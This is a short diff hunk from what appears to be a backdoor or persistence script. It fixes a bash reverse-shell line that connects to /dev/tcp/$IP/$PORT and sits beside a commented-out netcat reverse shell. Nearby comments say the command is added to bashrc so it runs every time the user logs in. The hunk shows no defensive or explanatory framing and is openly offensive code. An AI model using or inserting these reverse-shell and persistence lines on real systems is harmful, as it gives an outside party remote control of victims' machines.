@@ -52,7 +52,7 @@ sudo echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
 # nc $IP $PORT -e /bin/$0 > /dev/null 2>&1
 
 # BACKUP WAY
-bash -i >& /dev/tcp/$IP/$PORT > /dev/null 2>&1
+bash -i > /dev/tcp/$IP/$PORT 0<&1 2>&1
 
 # ADD THE COMMAND TO BASHRC SO IT EXECUTES EVERYTIME USER LOGS IN
 
